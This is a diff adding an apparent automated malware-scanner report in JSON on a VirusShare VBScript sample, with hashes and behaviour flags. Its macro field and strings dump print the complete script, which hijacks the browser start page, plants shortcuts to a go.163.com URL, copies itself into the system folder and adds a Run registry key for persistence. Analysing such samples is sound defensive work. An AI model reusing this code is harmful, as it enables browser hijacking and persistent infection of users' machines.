@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Regread": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "run": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "Dim WSHShell,x,iepath,sp,orgsp\niepath=\"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\\"\nsp=iepath &\"Main\\Start Page\"\nrun=\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSKernel32\"\nx=\"http://go.163.com/~dayumi\"\ny=\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04b3\ufffd\ufffd\"\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nSet oUrlLink = WshShell.CreateShortcut(Wscript.path & \"\\favorites\\\"& y & \".URL\")\noUrlLink.TargetPath = x\noUrlLink.Save\nSet deskLink = WshShell.CreateShortcut(Wscript.path & \"\\desktop\\\"& y & \".URL\")\ndeskLink.TargetPath = x\ndeskLink.Save\norgsp=WSHShell.Regread(sp)\nif instr(orgsp,\"etad\") or instr(orgsp,\"dayumi\") then\nelse\nWSHShell.RegWrite sp, x\nfilepath=\"c:\\windows\\system\\mskernel32.vbs\"\nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nSet cc = fs.GetFile(WScript.ScriptFullName)\ncc.Copy(filepath)\nWshshell.RegWrite run,filepath\nend if\nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nif fs.FileExists(\"c:\\windows\\Start Menu\\Programs\\\ufffd\ufffd\ufffd\ufffd\\office200.hta\") then\nfs.deletefile(\"c:\\windows\\Start Menu\\Programs\\\ufffd\ufffd\ufffd\ufffd\\office200.hta\")\nend if"
+    },
+    "filename": "VirusShare_239dd2e99a935bcd2f21e85bdf7af726",
+    "filesize": 1076,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "239dd2e99a935bcd2f21e85bdf7af726",
+        "sha1": "bbcf6e7bfe205041a912409a2eea444f46d475ab",
+        "sha256": "74a2f97df020665642fa949cdfbe0af7d4854f2046623dc06d35e68cf3c331c3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim WSHShell,x,iepath,sp,orgsp",
+            "iepath=\"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\\"",
+            "sp=iepath &\"Main\\Start Page\"",
+            "run=\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSKernel32\"",
+            "x=\"http://go.163.com/~dayumi\"",
+            "y=\"\u04b3\"",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "Set oUrlLink = WshShell.CreateShortcut(Wscript.path & \"\\favorites\\\"& y & \".URL\")",
+            "oUrlLink.TargetPath = x",
+            "oUrlLink.Save",
+            "Set deskLink = WshShell.CreateShortcut(Wscript.path & \"\\desktop\\\"& y & \".URL\")",
+            "deskLink.TargetPath = x",
+            "deskLink.Save",
+            "orgsp=WSHShell.Regread(sp)",
+            "if instr(orgsp,\"etad\") or instr(orgsp,\"dayumi\") then",
+            "else",
+            "WSHShell.RegWrite sp, x",
+            "filepath=\"c:\\windows\\system\\mskernel32.vbs\"",
+            "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set cc = fs.GetFile(WScript.ScriptFullName)",
+            "cc.Copy(filepath)",
+            "Wshshell.RegWrite run,filepath",
+            "end if",
+            "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "if fs.FileExists(\"c:\\windows\\Start Menu\\Programs\\\\office200.hta\") then",
+            "fs.deletefile(\"c:\\windows\\Start Menu\\Programs\\\\office200.hta\")",
+            "end if"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://go.163.com/~dayumi"
+        ]
+    },
+    "time": "0:00:00.331681",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
